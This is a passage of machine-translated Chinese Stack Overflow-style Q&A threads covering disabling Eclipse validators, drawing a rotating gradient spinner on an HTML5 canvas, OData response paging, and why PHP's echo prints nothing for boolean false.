* * *

## 回答 #2

> 赞同：12
> 
> 时间：2016-01-21T16:42:00.983

它也可能有助于禁用验证生成器：

`Project Properties`-`Builders`

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2014-11-20T22:40:47.987

*   单击窗口 > 首选项，
*   在左侧窗格中选择验证。
*   选中暂停所有验证器（Juno 右侧窗格中的第二个复选框）
*   点击应用，点击确定

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-11-28T15:53:39.510

**Mac Eclipse 更新：**

根据您的要求禁用验证选项（您也可以禁用所有选项）。

`Eclipse => Preferences => Validation => Disable checkbox (or Disable All) => Apply`

参考截图：

[![在此处输入图像描述](https://i.stack.imgur.com/GlQTh.jpg)](https://i.stack.imgur.com/GlQTh.jpg)

# javascript - 在圆圈上做一个旋转渐变？

> ID：15899982
> 
> 赞同：4
> 
> 时间：2013-04-09T10:53:59.267
> 
> 标签：javascript, html, animation, canvas

我试图在一个圆圈上获得一个旋转渐变来跟随这个模型。 [![跟随线旋转渐变](https://i.stack.imgur.com/SgtWZ.png)](https://i.stack.imgur.com/SgtWZ.png)

我已经模拟了我在[JSFiddle 中尝试做的事情](https://jsfiddle.net/FPymt/)。

为方便起见，代码如下：

```
var canvas = document.getElementById('myCanvas');
var context = canvas.getContext('2d');
var radius = 75;
var startAngle = 0// 1.1 * Math.PI;
var endAngle = 2.0 * Math.PI;//1.9 * Math.PI;
var counterClockwise = false;

context.beginPath();
var gradient = context.createLinearGradient(radius, radius, 0, 0);
gradient.addColorStop(0, '#3b749a');
gradient.addColorStop(1, '#FFFFFF');
context.lineWidth = 15;

context.arc(radius, radius, radius, startAngle, endAngle, counterClockwise);

context.strokeStyle = gradient;
context.stroke(gradient); 
```

现在这是我的挑战。无论我尝试什么，我似乎都无法让渐变跟随路径。它似乎从它想要的任何角度应用，但不遵循路径。我究竟做错了什么？

其次，是否有可能像样机一样在一个边缘上得到一个圆角？

## 不完美解决方案的后续问题：

所以看起来没有办法用渐变来描边路径，只能将渐变应用到路径“切掉”的画布上。（并且 HTML5 中没有“圆形”渐变 AFAIK。）

由于提议的解决方案需要绘制两个元素，旋转/动画的最佳方法是什么？有了一个对象/上下文，我似乎可以抓住它，变换和旋转。有两个，我需要渲染到图像对象并旋转吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T01:40:39.347

这实际上并不是那么微不足道。也许有一种更简单的方法可以做到这一点，而我只是采取了艰难的方法。或者这可能是新事物。

我所做的是我最终在圆圈内绘制了一个渐变框。在一个间隔上，圆改变它的起点和终点，以便间隙旋转。发生这种情况时，我会重新计算渐变框以适应新的间隙，然后将其绘制在那里。结果是一个很好的效果。

在这个演示中，我将它设置为在颜色和不同尺寸上随机循环，以展示不同的微调器的外观并获得一些乐趣。

## **[jsFiddle 演示](http://jsfiddle.net/F53wW/)**

操作的关键在于这个函数：

```
function showSpinner(
 startAngle,endAngle,direction,radius,line,context,color,shadow)
{
 context.beginPath();
 var a = startAngle / Math.PI;
 a = a % 2;
 a = 2 - a;
 a *= Math.PI;
 var x = radius + Math.cos(a)*radius*1.7;
 var y = radius - Math.sin(a)*radius*1.7;
 var gradient = context.createLinearGradient(radius,radius,x,y);
 gradient.addColorStop(0.05, color);
 gradient.addColorStop(.60, '#FFFFFF');
 context.lineWidth = line;
 context.lineCap = "round";
 context.shadowBlur = 10;
 if( shadow === true )context.shadowColor = '#727272';
 context.arc(radius, radius, radius-line, startAngle, endAngle, direction);
 context.strokeStyle = gradient;
 context.stroke();
} 
```

该函数利用上述绘图函数来提供动画

```
function spinner(obj){
 var radius,line,color,shadow;
 if( obj && obj.hasOwnProperty("shadow") ){
  shadow = true;
 }else{ radius = 75; }
 if( obj && obj.hasOwnProperty("radius") ){
  radius = obj.radius;
 }else{ radius = 75; }
 if( obj && obj.hasOwnProperty("line") ){
  line = obj.line;
 }else{ line = 7; }
 var speed = {inc:0.04,loop:15};
 if( obj && obj.hasOwnProperty("speed") ){
  if( obj.speed == "slow" ){
   speed = {inc:0.02,loop:25};
  }
 }
 if( obj && obj.hasOwnProperty("color") ){
  color = obj.color;
 }else{ color = '#3b749a'; } 
 var canvas = document.getElementById('myCanvas');
 canvas.style.height = 2*(radius+line) + "px";
 canvas.style.width = 4*(radius+line) + "px";
 var context = canvas.getContext('2d');
 var startAngle,endAngle;
 var counterClockwise = false;
 var sa = 1.2;
 var ea = 0.85;

 var spinner = setInterval(function(){
   canvas.width = canvas.width;
   sa += speed.inc;
   ea += speed.inc;
   startAngle = sa * Math.PI;
   endAngle = ea * Math.PI;
   showSpinner(
     startAngle,
     endAngle,
     counterClockwise,
     radius,
     line,
     context,
     color, 
     shadow
   );
 },speed.loop);
 setTimeout(function(){ clearInterval(spinner);},15000);
 return spinner;
} 
```

但你真正需要做的就是使用它

```
spinner() 
```

如果你愿意，可以传入一个参数。您的选项是半径、线条、颜色、阴影和速度。

```
var obj = {};
obj.line = int - the size in pixels of the line width
obj.radius = int - the radius of the circle drawn (currently maxed at 75 for viewing, but you can always change the size of the canvas if you want)
obj.color = string - the color that the line of the spinner will be
obj.shadow = bool - show the shadow or don't show it
obj.speed = string - Only supports "slow" right now. Otherwise it will be fast 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T11:31:29.273

也许不是很优雅：

```
var canvas = document.getElementById('myCanvas');
var context = canvas.getContext('2d');
var x = canvas.width / 2;
var y = canvas.height / 2;
var radius = 67.5;
context.beginPath();
context.arc(x, y, radius, 0, 2.0 * Math.PI, false);
context.lineWidth = 15;
context.strokeStyle = '#3b749a';
context.stroke();

context.beginPath();
context.arc(x, y, radius, -Math.PI/2, Math.PI/2, false);
var gradient = context.createLinearGradient(0, y-radius, 0, y+radius);
gradient.addColorStop(0, '#3b749a');
gradient.addColorStop(0.5, '#FFFFFF');
gradient.addColorStop(1, '#3b749a');
context.lineWidth = 15;
context.strokeStyle = gradient;
context.stroke(gradient); 
```

# wcf - Odata 响应长度

> ID：15899993
> 
> 赞同：0
> 
> 时间：2013-04-09T10:54:38.827
> 
> 标签：wcf, asp.net-web-api, odata

我正在查看一些地方，但无法找到有关 OData 消息长度的详细信息。当响应太长时，消息被分块，最后一条消息包含指向下一个响应部分的链接。我想知道是否有能力增加单个响应长度的大小，限制是什么？

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T04:56:01.097

您是在谈论服务器驱动的分页吗？您可以使用 QueryableAttribute 上的 PageSize 属性来控制页面中实体的数量。更多关于[这个](http://www.asp.net/web-api/overview/odata-support-in-aspnet-web-api/supporting-odata-query-options#server-paging)的官方教程。

# php - 鉴于 $var = 1，为什么 $var = $var === 0 不会返回 false？

> ID：15899994
> 
> 赞同：2
> 
> 时间：2013-04-09T10:54:43.170
> 
> 标签：php

首先，我在这里处理 1 和 0，我很清楚 1 == true 和 0 == false。但是我很好奇为什么这不起作用：

```
$var = 1;
echo $var; /* 1 */
$var = $var === 0;
echo $var; /* Nothing */ 
```

是否有第二个实例`echo $var;`不返回 0（假）而是不返回任何内容的原因？

同样，`!$var`也不返回任何内容。是什么导致了这种行为？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:57:51.287

`var_dump()`使用代替更容易显示正在发生的事情`echo`，因为显示了类型：

```
$var = 1;
var_dump($var); /* int(1) */
$var = $var === 0;
var_dump($var); /* bool(false) */ 
```

`$var`最后是假的，因为`$var === 0`评估为假，然后将该值分配给`$var`.

`echo`由于 boolean false 评估为空字符串，因此最终没有输出任何内容：请参阅[http://www.php.net/manual/en/language.types.string.php](http://www.php.net/manual/en/language.types.string.php)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-09T10:59:27.697

`0``false`在松散的比较中等于，但`0` *不是*`false`。变量设置为`false`，并且`false`回显到字符串中的是`""`（空字符串）。

请参阅[http://www.php.net/manual/en/language.types.string.php#language.types.string.casting](http://www.php.net/manual/en/language.types.string.php#language.types.string.casting)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-09T10:58:58.753

那是因为

```
$var = $var === 0; 
```

可以读作：

```
$var = ($var === 0);   // sets $var to the result of the comparison 
```

在正确的优先级。现在当`$var`is时`1`，`($var === 0)`返回`false`通过 输出时表示为空字符串`echo`。

`false`您可以通过使用运算符将​​值显式转换为整数来查看“0” `(int)`：

```
echo (int)$var;        // ouputs "0" 
```

`false`PHP 将值表示为空字符串，因为 PHP 变量通常没有类型。没有 boolean、int 或 string - 仅在值的内部表示中（在 Zend 引擎中称为 ZVAL）。

在 PHP 代码中，ZVAL 会自动转换为最匹配的类型，具体取决于您使用它的位置。这称为[类型杂耍^(Docs)](http://php.net/manual/en/language.types.type-juggling.php)。

由于 PHP 旨在生成网站，因此空变量 (false == 0 == "")在输出[^(Docs)](http://www.php.net/manual/en/language.types.string.php#language.types.string.casting)[中用空字符串表示](http://www.php.net/manual/en/language.types.string.php#language.types.string.casting)。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-09T11:06:26.547

为了弄清楚这一点，你需要知道两件事：

*   **[运算符优先级](http://php.net/manual/en/language.operators.precedence.php)**

您会注意到`=`的优先级低于`===`，因此表达式`$var = $var === 0;`变为`$var = ($var === 0);`- 并且在这种情况下`$var`包含`(bool)false`

*   **[铸造（或类型杂耍）](http://php.net/manual/en/language.types.type-juggling.php)**

由于[echo](http://php.net/manual/en/function.echo.php)对字符串进行操作，`$var`将被转换为字符串。并且布尔值`false`在转换为字符串时会导致空字符串（`NULL`顺便说一句）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-09T10:57:44.873

如果添加 var_dump($var); 在那个小块的末尾，你会看到 $var = false。

那是因为 $var === 0; 是假的；

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-09T11:05:30.747

代码的关键部分是这样的：

```
echo $var; 
```

[echo](http://php.net/echo)构造接收并生成字符串。如果您的变量是布尔值，则应用适当的[转换](http://www.php.net/manual/en/language.types.string.php#language.types.string.casting)：

> 布尔 TRUE 值转换为字符串“1”。**Boolean FALSE 被转换为 ""（空字符串）**。这允许在布尔值和字符串值之间来回转换。

这就是为什么`echo`不是一个好的调试工具的原因，因为将所有内容展平为字符串会导致有价值信息的丢失，除非您使用的工具知道如何提取该信息（并且`echo`不知道）。为此，[var_dump()](http://php.net/var_dump)通常是更好的选择。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-09T10:59:14.050

`$var = $var === 0;``$var === 0`将（即`false`）的结果分配给`$var`. 并且`echo false`不产生任何输出。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-09T10:59:20.760

当您使用`===`时，它还匹配数据类型。所以在这种情况下，`1 === TRUE` 不是 TRUE。

```
$var = 1;
echo $var; /* 1 */
$var = $var === 0;
echo $var; /* Nothing */ 
```

在你的第三行，`$var === 0`评估为`FALSE`，所以，就像你把

```
$var = FALSE; 
```

您不能打印布尔字符。但是，如果你`var_dump($var);`，你会看到它是一个布尔值 FALSE。